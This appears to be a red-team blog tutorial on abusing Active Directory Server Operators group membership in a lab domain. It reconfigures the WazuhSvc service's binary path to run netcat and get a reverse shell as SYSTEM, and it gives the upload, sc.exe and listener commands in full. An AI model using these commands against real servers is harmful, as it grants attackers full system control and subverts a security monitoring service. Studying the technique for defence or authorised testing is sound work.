---
title: "Domain Privilege Escalation Server Operator Group"
date: 2024-02-12 00:00:00 +0000
categories: 
  - Domain Privilege Escalation
  - Active Directory
  - RedTeam
---

The Windows Server operating system uses two types of security principals for authentication and authorization: user accounts and computer accounts. These accounts are created to represent physical entities, such as people or computers, and can be used to assign permissions to access resources or perform specific tasks. Additionally, security groups are created to include user accounts, computer accounts, and other groups, in order to make it easier to manage permissions. The system comes pre-configured with certain built-in accounts and security groups, which are equipped with the necessary rights and permissions to carry out functions.

### Introduction to windows privileged groups

In Active Directory, privileged groups are also known as security groups. Security groups are collections of user accounts that have similar security requirements. By placing user accounts into appropriate security groups, administrators can grant or deny access to network resources in bulk. Security groups can be used to grant or deny access to network resources, such as shared folders, printers, and applications. They can also be used to assign permissions to user accounts, such as the ability to create, delete, or modify files.



### What is Server operator group

(Members can modify services, access SMB shares, and backup files)
The Server Operator group is a special user group that often has access to powerful commands and settings on a computer system. This group is typically used for managing a server or for troubleshooting system problems. Server Operators are usually responsible for monitoring the server’s performance, managing system security, and providing technical support to users. They may also oversee installing software updates, creating and maintaining user accounts, and performing routine maintenance tasks.

### Lab Configuration

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-1.png)](https://r00tven0m.github.io/)

Let’s configure the lab on the server to apply theory and escalated windows server privileges. Go to server manager dashboard then click on “**Tools**” then select “**Active Directory Users and Computers**”

We are going to add a user aarti to the active directory security group for the demonstration. To do that, go to **“users**” select “**carole.rose**” and click on “**properties**”.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-2.png)](https://r00tven0m.github.io/)
That will open a new window where we need to click on the “ **member of** “ tab and then click on the “**add**” button to add user to any specific group.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-3.png)](https://r00tven0m.github.io/)


A new window will open where we need to select object types as “**Groups or Built-in security principals**” and select location to domain name which is “**cbank. local**” here. Then, we need to enter object name which is the group to that we wish to add user to. In this case, we are using the **server operators’** group then click ok.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-4.png)](https://r00tven0m.github.io/)


We can verify whether a user is added to the server operators’ group by simply clicking on the **members of** tab. We can see that we have successfully added user carole.rose to server operators’ group.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-5.png)](https://r00tven0m.github.io/)


We end up with our lab set up here and logged in as low privileged user in the server where we can see user carole.rose is in the server operators’ group. In this example, we have connected to the compromised host using the winrm service using the evil-winrm tool. To check group permission, we can simply use the inbuilt command "net user username", it will show what groups the current user belongs to. To reproduce the concept, please follow the commands below
[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-6.png)](https://r00tven0m.github.io/)


Being a member of server operator group is not a vulnerability, but the member of this group has special privileges to make changes in the domain which could lead an attacker to escalate to system privilege. We listed services running on the server by issuing “**services**” command in our terminal where we can see list of services are there. Then we noted the service name “**WazuhSvc**” and service binary path for lateral usage.

[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-7.png)](https://r00tven0m.github.io/)

### Exploitation

Then we transferred **netcat.exe** binary to the compromised host and changed the binary path of the service. The reason we are changing the binary path is to receive a reverse connection as system user from the compromised hosts.

**How it works?**

When we start any service then it will execute the binary from its binary path so if we replace the service binary with netcat or reverse shell binary then it will give us a reverse shell as a system user because the service is starting as a system on the compromised host. Please note, we need to specify the attacker’s IP address and listening port number with the netcat binary.

Steps to reproduce the POC:

```bash
upload nc.exe
sc.exe config WazuhSvc binPath="C:\Users\carole.rose.CBANK\Documents\nc.exe -e cmd.exe 192.168.56.1 9001"
```
[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-8.png)](https://r00tven0m.github.io/)

Then we will stop the service and start it again. So, this time when service starts, it will execute the binary that we have set in set earlier. Please, set up a netcat listener on the kali system to receive system shell before starting service and service start and stop commands from compromised hosts.

```bash
nc -nvlp 9001
sc.exe stop WazuhSvc
sc.exe start WazuhSvc
```
[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-9.png)](https://r00tven0m.github.io/)

We have received a reverse shell from the compromised host as **nt authority\system**. To verify it simply run “**whoami**” command.


[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Server Operator/2024-02-12-10.png)](https://r00tven0m.github.io/)
